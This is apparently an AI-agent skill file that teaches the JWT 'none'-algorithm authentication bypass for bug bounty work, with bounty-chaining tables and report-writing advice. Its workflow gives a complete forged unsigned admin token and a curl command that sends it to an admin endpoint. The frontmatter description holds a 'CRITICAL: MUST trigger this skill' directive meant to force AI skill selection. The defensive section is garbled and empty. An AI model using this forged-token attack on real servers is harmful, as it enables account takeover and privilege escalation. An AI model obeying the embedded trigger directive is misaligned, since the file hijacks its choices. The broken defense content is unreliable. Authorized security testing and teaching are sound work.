---
name: jwt-null-signature
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit JSON Web Tokens (JWT) by implementing the 'None' algorithm attack. This skill 
  details how to bypass authentication mechanisms when a server improperly accepts JWTs 
  with the `alg` header set to `none`, allowing attackers to forge tokens without a valid signature.
domain: cybersecurity
subdomain: bug-hunting
category: APIs
difficulty: beginner
estimated_time: "30-45 mins"
mitre_attack:
  tactics: [TA0006, TA0004]
  techniques: [T1550.004]
platforms: [web, api]
tags: [jwt, authentication-bypass, none-algorithm, web-vulnerabilities, api-security]
tools: [burp-suite, jwt_tool, base64]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# JWT 'None' Algorithm Bypass

## When to Use
- When assessing web applications or microservices that utilize JWTs for authentication and authorization.
- Specifically during the initial phases of analyzing a JWT implementation to check for fundamental configuration flaws in token verification.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Capture and Decode the Token

Intercept a valid request containing your JWT (usually in the `Authorization: Bearer <token>` header or a cookie). A JWT consists of three base64-url encoded parts separated by periods: `Header.Payload.Signature`.

```bash
# Concept: Decode the Header and Payload Token: eyJhbGciOiJIUzI1NiIsInR5cCI...
echo "eyJhbGciOiJIUzI1NiIsInR5cCI..." | base64 -d
# Header Output: {"alg":"HS256","typ":"JWT"}
```

### Phase 2: Modify Header to 'None' Algorithm

Change the `alg` value in the header. Servers might accept variations of the string "none".

```json
// {"alg": "none", "typ": "JWT"}
// Other variations to try: "None", "NONE", "nOnE"
```
Re-encode this modified header to Base64-URL format (ensure no padding `=`).

### Phase 3: Modify Payload (Elevation of Privilege)

Modify the payload to elevate privileges or impersonate another user.

```json
// {"sub": "admin", "iat": 1516239022, "admin": true}
```
Re-encode the modified payload to Base64-URL format.

### Phase 4: Construct and Send the Forged Token

Combine the new header and payload, appending a trailing dot, but **remove the signature completely**.

```text
# [Base64_Header_None].[Base64_Payload_Admin].
```

Send the request with the new token via Burp Suite or curl.

```bash
# curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiYWRtaW4iOnRydWV9." http://target.local/api/admin
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Capture JWT ] --> B[Decode Header & Payload ]
    B --> C[Change alg to 'none' ]
    C --> D[Modify Payload ]
    D --> E[Re-encode (No Signature) ]
    E --> F{Bypass Successful? ]}
    F -->|Yes| G[Privilege Escalated ]
    F -->|No| H[Try other JWT attacks ]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Enforce Algorithm Verification**: **Library Configuration**: **Reject 'None' Explicitly**: Key Concepts
| Concept | Description |
|---------|-------------|
| JWT Integrity | |
| JWT Anatomy | |


## Output Format
```
Jwt Null Signature — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (JWT)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **HackerOne (Jira integration)** | $2,500 | updatelap | JWT leak in Jira plugin → unauthorized access to Jira data | 2024 |
| **HackerOne program** | (Duplicate) | (Undisclosed) | JWT tokens in URLs + plaintext creds in JWT payloads → full ATO | 2023 |

**Key Lesson**: JWT-in-URL is a classic finding — tokens leak via Referer headers, server logs,
and browser history. The duplicate status on the second report proves: **submit fast, submit first**.

**Real attack flow that gets paid:**
1. Intercept JWT from target app
2. Decode payload at jwt.io — check for sensitive data in claims
3. Test `alg: none` → does the server accept unsigned tokens?
4. Test RS256→HS256 confusion → sign with public key as HMAC secret
5. Modify claims (role: admin, user_id: victim) → test authorization bypass

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- PortSwigger: [JWT Algorithms](https://portswigger.net/web-security/jwt)
- RFC 7519: [JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
